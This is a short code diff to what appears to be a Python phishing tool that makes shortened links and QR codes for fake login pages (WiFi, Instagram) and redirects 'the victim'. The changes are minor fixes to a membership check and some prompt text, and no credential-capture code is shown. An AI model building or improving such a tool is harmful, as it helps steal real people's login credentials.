@@ -116,7 +116,7 @@ def attack(server,url,wifi,custom,qr):
             print(colored('[*] Generating links....','green',attrs=['bold']))    
             while 1:    
                 try:
-                    link = get_link()  
+                    link = get_link()
                     qrc = ''
                     shortened = ''
                     if custom:
@@ -322,8 +322,8 @@ def main():
             server = server_list[int(ch)]
             break
         else:
-            print(colored('[*] Invalid choice','yellow',attrs=['bold']))    
-    if server.upper() not in 'WIFI INSTAGRAM-VERIFIED':
+            print(colored('[*] Invalid choice','yellow',attrs=['bold'])) 
+    if server.upper() not in ['WIFI', 'INSTAGRAM-VERIFIED']:
         r = colored('[*] Enter the URL you want to redirect the victim to (default is homepage of '+server.upper()+') : ','green',attrs=['bold'])    
         print()
         redir_url = input(r)
@@ -362,7 +362,7 @@ def main():
     else:
         wifi_model = redir_url = ''
     print()
-    custom = input(colored('[*] Enter a custom shortened URL name (leave empty to generate a random shortened URL) ','green',attrs=['bold']))
+    custom = input(colored('[*] Enter a custom shortened URL name (leave empty to generate a random shortened URL) : ','green',attrs=['bold']))
     print()
     qr = input(colored('[*] Do you want to generate a QR Code for the link (Y/N)? '))
     qr = 1 if qr.upper() == 'Y' else 0
